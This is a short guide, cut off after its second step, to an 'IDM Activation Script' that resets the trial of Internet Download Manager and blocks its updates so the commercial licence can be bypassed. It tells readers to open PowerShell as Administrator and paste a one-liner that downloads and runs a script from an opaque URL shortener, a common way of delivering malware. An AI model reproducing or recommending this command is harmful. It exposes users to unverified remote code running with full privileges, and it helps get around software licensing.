# IDM Activation Script (IAS)

## How to Reset, Freeze, Activate, and Block Updates for IDM Using PowerShell

Follow these steps to use the **IDM Activation Script (IAS)** to manage an expired IDM trial. The process involves running the script via PowerShell as Administrator and following a specific sequence of actions for the best results.

### Prerequisites

* **IDM Installed**: Ensure IDM is installed (download from [www.internetdownloadmanager.com](https://www.internetdownloadmanager.com) if needed).
* **PowerShell Access**: You need PowerShell (available by default on Windows 7/8/8.1/10/11).
* **Administrator Privileges**: PowerShell must be run as Administrator to modify registry and firewall settings.

### Step-by-Step Instructions

#### Step 1: Run PowerShell as Administrator

1.  Press `Windows key + S`, type **PowerShell**, right-click **Windows PowerShell**, and select **Run as administrator**.

#### Step 2: Execute the IAS Script

1.  In the PowerShell window, paste and run the following command:
    ```powershell
    iex (irm is.gd/IDMFIXBYPUNISHER)
    ```
2.  This downloads and executes the `IAS.cmd` script from the GitHub repository.
3.  A command prompt window will open displaying the IAS menu: